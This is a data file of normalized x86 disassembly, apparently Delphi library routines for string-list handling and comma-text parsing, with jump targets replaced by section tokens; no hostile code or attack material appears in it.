sub_417714
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4040f0
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_416668
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_417460
xor ecx ecx
mov edx esi
mov eax ebx
call sub_4170c4
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_416754
sub_41777c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_4168b0
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_416964
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4166b4
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_4170c4
mov eax ebx
call sub_417460
pop edi
pop esi
pop ebx
retn
sub_4177e0
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_417804
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_41730c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_41784c
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_418570
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416d9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_41787c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4178a0
push ebx
push esi
push edi
mov edi ecx
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x24 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_4178c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41796b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_417a34
xor eax eax
push ebp
push sub_41794e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417955
mov eax [ ebp - 0x4 ]
call sub_417af0
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_41797c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416dc8
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_417a34
xor eax eax
push ebp
push sub_417a1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
movzx eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
movzx eax [ esi + 0xd ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xd ] al
movzx eax [ esi + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] al
movzx eax [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov eax [ ebp - 0x4 ]
add eax 0x8
mov edx [ esi + 0x8 ]
call sub_404e98
movzx eax [ esi + 0xe ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xe ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_417af0
retn
sub_417a4c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_417b04
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_417aa4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_4183e0
mov eax [ ebp - 0x8 ]
push eax
push sub_418850
push ebp
call sub_417a4c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417b04
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417b99
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417ba0
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404e68
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_405270
jne r-xdata
sub_417bb0
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_417bac
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf0
jmp sub_4047d8
sub_417be8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417c30
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_406fd4
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_417bb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c37
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_417c40
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_417d1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_417a34
xor eax eax
push ebp
push sub_417cf6
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417cfd
mov eax [ ebp - 0x8 ]
call sub_417af0
retn
sub_417d2c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_417d9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx edi
call sub_404e98
mov eax esi
call sub_418bb0
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_40502c
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_40e924
test eax eax
je r-xdata
mov eax ebx
xor edx edx
call sub_4055ac
mov edx eax
dec edx
mov eax ebx
call sub_4055ac
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417da2
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_417db0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417e01
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_417d2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e08
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
sub_417e14
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_417e59
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_405324
call sub_40a550
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417e60
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_417e68
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_417f91
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418a88
mov esi [ ebp - 0x1c ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
xor edx edx
call sub_404f34
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov esi [ ebp - 0x1c ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x14 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f98
lea eax [ ebp - 0x24 ]
call sub_404e44
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov ebx eax
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
add edx eax
add [ ebp - 0x18 ] edx
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
sub edx 0x4
mov edx [ edx ]
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ecx ebx
call sub_402f9c
add [ ebp - 0x20 ] ebx
lea ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x28 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov ecx ebx
call sub_402f9c
add [ ebp - 0x20 ] ebx
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub_417fa0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_418029
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov ebx eax
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_404e44
mov [ ebp - 0x8 ] edi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
add edx 0x2
mov ecx 0x7fffffff
call sub_405384
jmp r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418030
lea eax [ ebp - 0xc ]
call sub_404e44
retn
sub_418038
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4180b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4180b7
lea eax [ ebp - 0xc ]
call sub_404e44
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_4180c4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_418187
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0xc ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_418bb0
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_40502c
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_40e924
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41818e
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_418198
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_4181cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4181fc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_419774
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418244
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41824b
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
sub_418250
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4182ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_417a34
xor eax eax
push ebp
push sub_4182d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_4192c0
sub esi eax
lea eax [ ebp - 0x4 ]
mov ecx esi
xor edx edx
call sub_404f34
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4182d7
mov eax [ ebp - 0x8 ]
call sub_417af0
retn
sub_4182fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41839d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4183a4
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax [ ebp - 0x8 ]
call sub_417a34
xor eax eax
push ebp
push sub_418380
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_417af0
retn
sub_4183ac
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx ebp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4183e0
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418484
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41b7b0
mov eax [ ebp - 0x4 ]
call sub_417a34
xor eax eax
push ebp
push sub_41845f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41a6fc
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41c48c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418466
mov eax [ ebp - 0x4 ]
call sub_417af0
retn
sub_418490
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_419774
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4184db
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4184e2
mov eax [ ebp - 0x4 ]
call sub_403f64
retn
sub_4184e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418539
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx eax
mov eax esi
call sub_419524
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418540
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub eax 0x4
mov eax [ eax ]
sub_41854c
push ebx
push esi
mov esi edx
mov ebx eax
mov dl 0x2c
mov eax ebx
call sub_418aec
mov dl 0x22
mov eax ebx
call sub_418b34
mov edx esi
mov eax ebx
call sub_4188d4
pop esi
pop ebx
retn
sub_418570
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx esi
call sub_406b0c
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_4185a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4185e7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_40503c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4185ee
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4185f4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41877d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_417a34
xor edx edx
push ebp
push sub_41874b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418752
mov eax [ ebp - 0x8 ]
call sub_417af0
retn
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_418a88
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_409180
test eax eax
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
jmp r-xdata
mov eax sub_40e9f0
mov [ ebp - 0x10 ] eax
mov eax sub_40a4dc
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_418a88
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
mov esi ebx
jmp r-xdata
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
movzx eax [ ebx ]
test al al
je r-xdata
mov esi ebx
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
call sub_418a88
mov eax [ ebp - 0x20 ]
call sub_405324
mov edx eax
mov eax ebx
call [ ebp - 0x10 ]
mov edi eax
jmp r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404f34
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub al 0x3
jne r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404f34
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp edi ebx
jne r-xdata
cmp edi ebx
jne r-xdata
inc ebx
inc ebx
mov eax [ ebp - 0xc ]
add ebx eax
inc ebx
sub_418752
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418784
lea eax [ ebp - 0x20 ]
call sub_404e44
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_41879c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
